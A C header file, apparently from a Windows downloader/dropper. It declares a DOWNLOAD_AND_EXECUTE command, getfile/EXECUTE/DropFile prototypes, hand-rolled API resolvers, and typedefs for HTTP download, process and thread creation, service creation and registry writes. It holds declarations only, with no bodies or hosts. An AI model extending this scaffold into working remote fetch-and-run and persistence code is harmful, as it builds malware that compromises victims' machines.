#pragma warning(disable:4201)

#define FSCTL_PIPE_LISTEN   CTL_CODE(FILE_DEVICE_NAMED_PIPE, 2, METHOD_BUFFERED, FILE_ANY_ACCESS)
#include <windows.h>
#define CONFIGURE CTL_CODE(FILE_DEVICE_UNKNOWN, 2048, METHOD_IN_DIRECT, FILE_ANY_ACCESS)
#define DRIVER_CODE 

typedef struct _CONFIG {
	LPWSTR ProgramPath;
}CONFIG, *PCONFIG;



typedef enum _Commands {
	NOTHING,
	DOWNLOAD_AND_EXECUTE
}Commands;


#define 	OBJ_CASE_INSENSITIVE   0x00000040

#define FILE_NON_DIRECTORY_FILE 0x00000040


#define FILE_SUPERSEDE                  0x00000000
#define FILE_OPEN                       0x00000001
#define FILE_CREATE                     0x00000002
#define FILE_OPEN_IF                    0x00000003
#define FILE_OVERWRITE                  0x00000004
#define FILE_OVERWRITE_IF               0x00000005
#define FILE_MAXIMUM_DISPOSITION        0x00000005

typedef struct _MY_LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} MY_LSA_UNICODE_STRING, *PMY_LSA_UNICODE_STRING, MY_UNICODE_STRING, *PMY_UNICODE_STRING;
typedef struct _MY_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PCHAR  Buffer;
} MY_ANSI_STRING, *PMY_ANSI_STRING;
typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	} DUMMYUNIONNAME;
	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
typedef NTSTATUS(NTAPI *_NtWaitForSingleObject)(
	_In_ HANDLE         Handle,
	_In_ BOOLEAN        Alertable,
	_In_ PLARGE_INTEGER Timeout
	);
_NtWaitForSingleObject NtWaitForSingleObject;
typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PMY_UNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

#define STATUS_SUCCESS 0x00000000
#define STATUS_UNSUCCESSFUL 0xC0000001
typedef NTSTATUS(NTAPI *_NtCreateFile)(
	_Out_    PHANDLE            FileHandle,
	_In_     ACCESS_MASK        DesiredAccess,
	_In_     POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_    PIO_STATUS_BLOCK   IoStatusBlock,
	_In_opt_ PLARGE_INTEGER     AllocationSize,
	_In_     ULONG              FileAttributes,
	_In_     ULONG              ShareAccess,
	_In_     ULONG              CreateDisposition,
	_In_     ULONG              CreateOptions,
	_In_     PVOID              EaBuffer,
	_In_     ULONG              EaLength
	);
_NtCreateFile NtCreateFile;
typedef VOID(NTAPI *PIO_APC_ROUTINE)(
	_In_ PVOID ApcContext,
	_In_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_ ULONG Reserved
	);
typedef VOID(NTAPI *_RtlInitUnicodeString)(
	PMY_UNICODE_STRING         DestinationString,
	__drv_aliasesMem PCWSTR SourceString
	);
_RtlInitUnicodeString RtlInitUnicodeString;
typedef NTSTATUS(NTAPI *_NtWriteFile)(
	HANDLE           FileHandle,
	HANDLE           Event,
	PIO_APC_ROUTINE  ApcRoutine,
	PVOID            ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	PLARGE_INTEGER   ByteOffset,
	PULONG           Key
	);
_NtWriteFile NtWriteFile;
typedef NTSTATUS(NTAPI *_NtReadFile)(
	HANDLE           FileHandle,
	HANDLE           Event,
	PIO_APC_ROUTINE  ApcRoutine,
	PVOID            ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	PLARGE_INTEGER   ByteOffset,
	PULONG           Key
	);
_NtReadFile NtReadFile;
#define FSCTL_PIPE_PEEK 0X11400C

#define NT_SUCCESS(StatCode)  ((NTSTATUS)(StatCode) >= 0)
#define STATUS_BUFFER_OVERFLOW           ((NTSTATUS)0x80000005L)
typedef struct _FILE_PIPE_PEEK_BUFFER {
	ULONG   NamedPipeState;
	ULONG   ReadDataAvailable;
	ULONG   NumberOfMessages;
	ULONG   MessageLength;
	CHAR    Data[1];
} FILE_PIPE_PEEK_BUFFER, *PFILE_PIPE_PEEK_BUFFER;
typedef NTSTATUS(NTAPI *_NtFsControlFile)(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	IN ULONG                FsControlCode,
	IN PVOID                InputBuffer OPTIONAL,
	IN ULONG                InputBufferLength,
	OUT PVOID               OutputBuffer OPTIONAL,
	IN ULONG                OutputBufferLength);
_NtFsControlFile NtFsControlFile;
typedef NTSTATUS(NTAPI *_NtClose)(
	_In_ HANDLE Handle
	);
_NtClose NtClose;
typedef NTSTATUS(NTAPI *_NtCreateNamedPipeFile)(OUT PHANDLE FileHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, OUT PIO_STATUS_BLOCK IoStatusBlock, IN ULONG ShareAccess, IN ULONG CreateDisposition, IN ULONG CreateOptions, IN ULONG NamedPipeType, IN ULONG ReadMode, IN ULONG CompletionMode, IN ULONG MaximumInstances, IN ULONG InboundQuota, IN ULONG OutboundQuota, IN PLARGE_INTEGER DefaultTimeout OPTIONAL);
_NtCreateNamedPipeFile NtCreateNamedPipeFile;

typedef NTSTATUS(NTAPI *_RtlGetVersion)(
	_Out_ PRTL_OSVERSIONINFOW lpVersionInformation
	);
_RtlGetVersion RtlGetVersion;
typedef NTSTATUS(NTAPI *_NtQueryInformationProcess)(
	IN HANDLE  	ProcessHandle,
	IN ULONG ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);
_NtQueryInformationProcess NtQueryInformationProcess;

typedef NTSTATUS (NTAPI *_NtQuerySystemInformation)(
	_In_      USHORT SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength
);
_NtQuerySystemInformation NtQuerySystemInformation;
#define NtCurrentProcess() ((HANDLE)-1)


typedef struct _SYSTEM_PROCESSOR_INFORMATION
{
	USHORT ProcessorArchitecture;
	USHORT ProcessorLevel;
	USHORT ProcessorRevision;
	USHORT Reserved;
	ULONG ProcessorFeatureBits;
} SYSTEM_PROCESSOR_INFORMATION, *PSYSTEM_PROCESSOR_INFORMATION;


typedef NTSTATUS(NTAPI *_RtlExpandEnvironmentStrings_U)(
	IN PVOID                Environment OPTIONAL,
	IN PMY_UNICODE_STRING      SourceString,
	OUT PMY_UNICODE_STRING     DestinationString,
	OUT PULONG              DestinationBufferLength OPTIONAL);
_RtlExpandEnvironmentStrings_U RtlExpandEnvironmentStrings_U;

typedef BOOLEAN (WINAPI *__RtlGenRandom)(
	_Out_ PVOID RandomBuffer,
	_In_  ULONG RandomBufferLength
);
__RtlGenRandom _RtlGenRandom;


typedef NTSTATUS (NTAPI *_LdrLoadDll)(



	_In_opt_ PWCHAR               PathToFile,
	_In_opt_ ULONG                Flags,
	IN PMY_UNICODE_STRING      ModuleFileName,
	OUT PHANDLE             ModuleHandle);


_LdrLoadDll LdrLoadDll;
typedef NTSTATUS(NTAPI * _LdrGetDllHandle)(



	IN PWORD                pwPath OPTIONAL,
	IN PVOID                Unused OPTIONAL,
	IN PMY_UNICODE_STRING      ModuleFileName,
	OUT PHANDLE             pHModule);
_LdrGetDllHandle LdrGetDllHandle;

typedef NTSTATUS(NTAPI * _LdrGetProcedureAddress)(



	IN HMODULE              ModuleHandle,
	IN PMY_ANSI_STRING         FunctionName OPTIONAL,
	IN WORD                 Oridinal OPTIONAL,
	OUT PVOID               *FunctionAddress);
_LdrGetProcedureAddress LdrGetProcedureAddress;
 typedef NTSTATUS (NTAPI *_LdrUnloadDll)(IN HANDLE               ModuleHandle);
 _LdrUnloadDll LdrUnloadDll;
 typedef VOID (NTAPI *_RtlInitAnsiString)(PMY_ANSI_STRING  	DestinationString,
	 LPCSTR  	SourceString
 );
 _RtlInitAnsiString RtlInitAnsiString;

 typedef struct _MY_LSA_STRING {
	 USHORT Length;
	 USHORT MaximumLength;
	 PCHAR Buffer;
 } MY_LSA_STRING, *PMY_LSA_STRING;
 typedef VOID (NTAPI *_RtlInitString)(PMY_LSA_STRING  	DestinationString,
	 LPCSTR  	SourceString
 );
 _RtlInitString RtlInitString;
HANDLE getfile(LPCWSTR url, PBYTE *ppBuf, PDWORD pdwSize);

VOID EXECUTE(PWSTR FileName, PVOID Buffer, ULONG uBuflen);
extern PVOID My_GetModuleProcedureAddress(PVOID moduleBase, LPCSTR procName);
extern PVOID My_GetModuleBase(LPCWSTR moduleName);


#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020


typedef DWORD (WINAPI *__GetModuleFileName)(
	_In_opt_ HMODULE hModule,
	_Out_    LPTSTR  lpFilename,
	_In_     DWORD   nSize
);
__GetModuleFileName _GetModuleFileName;




size_t _strlen(LPCSTR String);
size_t _wcslen(LPCWSTR String);
INT _strncmp(LPCSTR s1, LPCSTR s2, SIZE_T n);

typedef LONG(WINAPI *__WinVerifyTrust)(HWND hwnd, GUID *pgActionID,
	LPVOID pWVTData);
__WinVerifyTrust _WinVerifyTrust;



typedef NTSTATUS (NTAPI *_NtDeviceIoControlFile)(



	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	IN ULONG                IoControlCode,
	IN PVOID                InputBuffer OPTIONAL,
	IN ULONG                InputBufferLength,
	OUT PVOID               OutputBuffer OPTIONAL,
	IN ULONG                OutputBufferLength);
_NtDeviceIoControlFile NtDeviceIoControlFile;

typedef struct _RTLP_CURDIR_REF
{
	LONG RefCount;
	HANDLE Handle;
} RTLP_CURDIR_REF, *PRTLP_CURDIR_REF;
typedef struct RTL_RELATIVE_NAME_U {
	MY_UNICODE_STRING RelativeName;
	HANDLE ContainingDirectory;
	PRTLP_CURDIR_REF CurDirRef;
	
} RTL_RELATIVE_NAME_U, *PRTL_RELATIVE_NAME_U;
typedef BOOLEAN(NTAPI* _RtlDosPathNameToNtPathName)(IN PCWSTR DosName,
	OUT PMY_UNICODE_STRING NtName,
	OUT PCWSTR *PartName,
	OUT PRTL_RELATIVE_NAME_U RelativeName);
_RtlDosPathNameToNtPathName RtlDosPathNameToNtPathName;


typedef LPVOID (WINAPI *__HeapAlloc)(
	_In_ HANDLE hHeap,
	_In_ DWORD dwFlags,
	_In_ SIZE_T dwBytes
);
__HeapAlloc _HeapAlloc;
typedef HANDLE (WINAPI *__GetProcessHeap)(VOID);
__GetProcessHeap _GetProcessHeap;
typedef BOOL (WINAPI *__HeapDestroy)(_In_ HANDLE hHeap);
__HeapDestroy _HeapDestroy;
typedef BOOL (WINAPI *__HeapFree)(_Inout_ HANDLE hHeap, _In_ DWORD dwFlags, __drv_freesMem(Mem) _Frees_ptr_opt_ LPVOID lpMem);
__HeapFree _HeapFree;

typedef NTSTATUS(NTAPI *_NtCreateThreadEx)
(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN ULONG StackZeroBits,
	IN ULONG SizeOfStackCommit,
	IN ULONG SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
);
_NtCreateThreadEx NtCreateThreadEx;
typedef NTSTATUS (NTAPI *_NtWaitForSingleObject)(
	_In_ HANDLE         Handle,
	_In_ BOOLEAN        Alertable,
	_In_ PLARGE_INTEGER Timeout
);
_NtWaitForSingleObject NtWaitForSingleObject;

typedef int(__cdecl *__wsprintfA)(LPSTR lpOut, LPCSTR lpFmt, ...);
typedef int(__cdecl *__wsprintfW)(LPWSTR lpOut, LPCWSTR lpFmt, ...);
__wsprintfA _wsprintfA;
__wsprintfW _wsprintfW;

CHAR UserAgent[3];



typedef SIZE_T (NTAPI *__RtlCompareMemory)(
	const VOID *Source1,
	const VOID *Source2,
	SIZE_T     Length
);
__RtlCompareMemory _RtlCompareMemory;


typedef BOOL (WINAPI *__InternetCloseHandle)(
	_In_ LPVOID hInternet
);
__InternetCloseHandle _InternetCloseHandle;
typedef LPVOID (WINAPI *__InternetConnectA)(
	_In_ LPVOID hInternet,
	_In_ LPCSTR lpszServerName,
	_In_ WORD nServerPort,
	_In_opt_ LPCSTR lpszUserName,
	_In_opt_ LPCSTR lpszPassword,
	_In_ DWORD dwService,
	_In_ DWORD dwFlags,
	_In_opt_ DWORD_PTR dwContext
);
__InternetConnectA _InternetConnectA;
typedef LPVOID (WINAPI *__HttpOpenRequestA)(
	_In_ LPVOID hConnect,
	_In_opt_ LPCSTR lpszVerb,
	_In_opt_ LPCSTR lpszObjectName,
	_In_opt_ LPCSTR lpszVersion,
	_In_opt_ LPCSTR lpszReferrer,
	_In_opt_z_ LPCSTR FAR * lplpszAcceptTypes,
	_In_ DWORD dwFlags,
	_In_opt_ DWORD_PTR dwContext
);
__HttpOpenRequestA _HttpOpenRequestA;
typedef BOOL (WINAPI *__InternetReadFile)(
	_In_ LPVOID hFile,
	_Out_writes_bytes_(dwNumberOfBytesToRead) __out_data_source(NETWORK) LPVOID lpBuffer,
	_In_ DWORD dwNumberOfBytesToRead,
	_Out_ LPDWORD lpdwNumberOfBytesRead
);
__InternetReadFile _InternetReadFile;
typedef LPVOID (WINAPI *__InternetOpenUrlW)(
	_In_ LPVOID hInternet,
	_In_ LPCWSTR lpszUrl,
	_In_reads_opt_(dwHeadersLength) LPCWSTR lpszHeaders,
	_In_ DWORD dwHeadersLength,
	_In_ DWORD dwFlags,
	_In_opt_ DWORD_PTR dwContext
);
__InternetOpenUrlW _InternetOpenUrlW;

typedef LPVOID(WINAPI *__InternetOpenA)(
	_In_opt_ LPCSTR lpszAgent,
	_In_ DWORD dwAccessType,
	_In_opt_ LPCSTR lpszProxy,
	_In_opt_ LPCSTR lpszProxyBypass,
	_In_ DWORD dwFlags
	);
__InternetOpenA _InternetOpenA;
typedef LPVOID(WINAPI *__InternetOpenW)(
	_In_opt_ LPCWSTR lpszAgent,
	_In_ DWORD dwAccessType,
	_In_opt_ LPCWSTR lpszProxy,
	_In_opt_ LPCWSTR lpszProxyBypass,
	_In_ DWORD dwFlags
	);
__InternetOpenW _InternetOpenW;

typedef BOOL (WINAPI *__CreateProcessW)(
	_In_opt_ LPCWSTR lpApplicationName,
	_Inout_opt_ LPWSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ BOOL bInheritHandles,
	_In_ DWORD dwCreationFlags,
	_In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCWSTR lpCurrentDirectory,
	_In_ LPSTARTUPINFOW lpStartupInfo,
	_Out_ LPPROCESS_INFORMATION lpProcessInformation
);
__CreateProcessW _CreateProcessW;
typedef DWORD (WINAPI* __GetFileAttributesW)(
	_In_ LPCWSTR lpFileName
);
__GetFileAttributesW _GetFileAttributesW;
typedef DWORD (WINAPI *__ExpandEnvironmentStringsW)(
	_In_ LPCWSTR lpSrc,
	_Out_writes_to_opt_(nSize, return) LPWSTR lpDst,
	_In_ DWORD nSize
);
__ExpandEnvironmentStringsW _ExpandEnvironmentStringsW;

typedef BOOL (WINAPI *__HttpSendRequestA)(
	_In_ LPVOID hRequest,
	_In_reads_opt_(dwHeadersLength) LPCSTR lpszHeaders,
	_In_ DWORD dwHeadersLength,
	_In_reads_bytes_opt_(dwOptionalLength) LPVOID lpOptional,
	_In_ DWORD dwOptionalLength
);
__HttpSendRequestA _HttpSendRequestA;
typedef LPVOID (WINAPI *__HeapReAlloc)(
	_Inout_ HANDLE hHeap,
	_In_ DWORD dwFlags,
	_Frees_ptr_opt_ LPVOID lpMem,
	_In_ SIZE_T dwBytes
);
__HeapReAlloc _HeapReAlloc;
typedef HANDLE (WINAPI *__HeapCreate)(
	_In_ DWORD flOptions,
	_In_ SIZE_T dwInitialSize,
	_In_ SIZE_T dwMaximumSize
);
__HeapCreate _HeapCreate;
#define STATUS_BUFFER_TOO_SMALL 0xC0000023
extern char *_strchr(const char *s, int c);

extern double _strtod(const char *s, char **sret);

extern long _strtol(const char *nptr, char **endptr, int base);

extern INT _strcmp(LPCSTR s1, LPCSTR s2);
extern INT _wcscmp(LPCWSTR s1, LPCWSTR s2);

extern long _strtol(const char *nptr, char **endptr, int base);

MY_UNICODE_STRING My_ExpandEnvironmentString(MY_UNICODE_STRING input);
typedef DWORD (WINAPI *__GetLastError)(VOID);
__GetLastError _GetLastError;

BOOL DropFile(PWSTR File, PVOID Buffer, ULONG uLength);
typedef BOOL (WINAPI *__GetCurrentHwProfileW)(
	_Out_ LPHW_PROFILE_INFOW  lpHwProfileInfo
);
__GetCurrentHwProfileW _GetCurrentHwProfileW;
typedef VOID (WINAPI *__Sleep)(
	_In_ DWORD dwMilliseconds
);
__Sleep _Sleep;
typedef LSTATUS (WINAPI *__RegCreateKeyExW)(
	_In_ HKEY hKey,
	_In_ LPCWSTR lpSubKey,
	_Reserved_ DWORD Reserved,
	_In_opt_ LPWSTR lpClass,
	_In_ DWORD dwOptions,
	_In_ REGSAM samDesired,
	_In_opt_ CONST LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	_Out_ PHKEY phkResult,
	_Out_opt_ LPDWORD lpdwDisposition
);
__RegCreateKeyExW _RegCreateKeyExW;
typedef LSTATUS (WINAPI *__RegCloseKey)(
	_In_ HKEY hKey
);
__RegCloseKey _RegCloseKey;
typedef LSTATUS (WINAPI *__RegSetValueExW)(
	_In_ HKEY hKey,
	_In_opt_ LPCWSTR lpValueName,
	_Reserved_ DWORD Reserved,
	_In_ DWORD dwType,
	_In_reads_bytes_opt_(cbData) CONST BYTE * lpData,
	_In_ DWORD cbData
);
__RegSetValueExW _RegSetValueExW;
typedef HRSRC (WINAPI* __FindResourceW)(
	_In_opt_ HMODULE hModule,
	_In_     LPCWSTR lpName,
	_In_     LPCWSTR lpType
);
__FindResourceW _FindResourceW;
typedef HGLOBAL (WINAPI *__LoadResource)(
	_In_opt_ HMODULE hModule,
	_In_ HRSRC hResInfo
);
__LoadResource _LoadResource;
typedef LPVOID (WINAPI*__LockResource)(
	_In_ HGLOBAL hResData
);
__LockResource _LockResource;
typedef DWORD (WINAPI *__SizeofResource)(
	_In_opt_ HMODULE hModule,
	_In_ HRSRC hResInfo
);
__SizeofResource _SizeofResource;
typedef BOOL (WINAPI *__FreeResource)(
	_In_ HGLOBAL hResData
);
__FreeResource _FreeResource;

typedef ULONG(NTAPI *__RtlGetCurrentDirectory_U)(_In_ ULONG  	MaximumLength,
	_Out_bytecap_(MaximumLength) PWSTR  	Buffer
);
__RtlGetCurrentDirectory_U _RtlGetCurrentDirectory_U;

typedef SC_HANDLE (WINAPI *__OpenSCManagerW)(
	_In_opt_        LPCWSTR                lpMachineName,
	_In_opt_        LPCWSTR                lpDatabaseName,
	_In_            DWORD                   dwDesiredAccess
);
__OpenSCManagerW _OpenSCManagerW;
typedef SC_HANDLE (WINAPI *__OpenServiceW)(
	_In_            SC_HANDLE               hSCManager,
	_In_            LPCWSTR                lpServiceName,
	_In_            DWORD                   dwDesiredAccess
);
__OpenServiceW _OpenServiceW;
typedef BOOL (WINAPI *__QueryServiceStatus)(
	_In_            SC_HANDLE           hService,
	_Out_           LPSERVICE_STATUS    lpServiceStatus
);
__QueryServiceStatus _QueryServiceStatus;
typedef DWORD (WINAPI *__GetCurrentDirectoryW)(
	_In_ DWORD nBufferLength,
	_Out_writes_to_opt_(nBufferLength, return +1) LPWSTR lpBuffer
);
__GetCurrentDirectoryW _GetCurrentDirectoryW;
typedef SC_HANDLE (WINAPI* __CreateServiceW)(
	_In_        SC_HANDLE    hSCManager,
	_In_        LPCWSTR     lpServiceName,
	_In_opt_    LPCWSTR     lpDisplayName,
	_In_        DWORD        dwDesiredAccess,
	_In_        DWORD        dwServiceType,
	_In_        DWORD        dwStartType,
	_In_        DWORD        dwErrorControl,
	_In_opt_    LPCWSTR     lpBinaryPathName,
	_In_opt_    LPCWSTR     lpLoadOrderGroup,
	_Out_opt_   LPDWORD      lpdwTagId,
	_In_opt_    LPCWSTR     lpDependencies,
	_In_opt_    LPCWSTR     lpServiceStartName,
	_In_opt_    LPCWSTR     lpPassword
);
__CreateServiceW _CreateServiceW;
typedef BOOL (WINAPI *__CloseServiceHandle)(
	_In_        SC_HANDLE   hSCObject
);

__CloseServiceHandle _CloseServiceHandle;


typedef BOOL (WINAPI *__GetExitCodeProcess)(
	HANDLE  hProcess,
	LPDWORD lpExitCode
);
__GetExitCodeProcess _GetExitCodeProcess;


typedef BOOL (WINAPI *__AllocateAndInitializeSid)(
	_In_  PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority,
	_In_  BYTE                      nSubAuthorityCount,
	_In_  DWORD                     dwSubAuthority0,
	_In_  DWORD                     dwSubAuthority1,
	_In_  DWORD                     dwSubAuthority2,
	_In_  DWORD                     dwSubAuthority3,
	_In_  DWORD                     dwSubAuthority4,
	_In_  DWORD                     dwSubAuthority5,
	_In_  DWORD                     dwSubAuthority6,
	_In_  DWORD                     dwSubAuthority7,
	_Out_ PSID                      *pSid
);
__AllocateAndInitializeSid _AllocateAndInitializeSid;